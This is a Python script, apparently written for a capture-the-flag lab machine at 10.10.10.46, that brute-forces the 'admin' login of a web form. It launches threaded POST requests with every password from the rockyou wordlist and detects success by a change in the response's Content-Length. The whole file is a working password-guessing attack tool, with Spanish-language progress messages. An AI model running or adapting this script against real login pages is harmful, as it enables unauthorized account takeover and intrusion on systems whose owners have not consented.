#!/usr/bin/python3
# coding: utf-8

import requests
import time
import signal
import threading
import sys

from pwn import *


def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.46/index.php"

check_data = {
    'username': 'test',
    'password': 'test'
        }
checkResponse = requests.post(main_url, data=check_data)
check = checkResponse.headers['Content-Length']


def makeRequest(password, check):

    data_post = {
        'username': 'admin',
        'password': password
    }

    response = requests.post(main_url, data=data_post)

    content_length = response.headers['Content-Length']

    if content_length != check:
        p1.success(f"\n\nLa password {password} es válida\n")
        sys.exit(0)


if __name__ == '__main__':
    passwords = []
    f = open("/usr/share/wordlists/rockyou.txt", encoding="ISO-8859-1")
    totalCounter = 0
    for line in f:
        totalCounter += 1
        passwords.append(line.rstrip())

    threads = []

    top = 500
    counter = 1

    p1 = log.progress("Fuerza bruta")
    p1.status("Aplicando fuerza bruta")
    time.sleep(2)
    for password in passwords:
        thread = threading.Thread(target=makeRequest, args=(password, check,))
        threads.append(thread)
        thread.start()

        p1.status(f"Probando password:   {password}   ({str(counter)}/{str(totalCounter)})")

        counter += 1

        if counter == top:
            top += 500
            time.sleep(3)
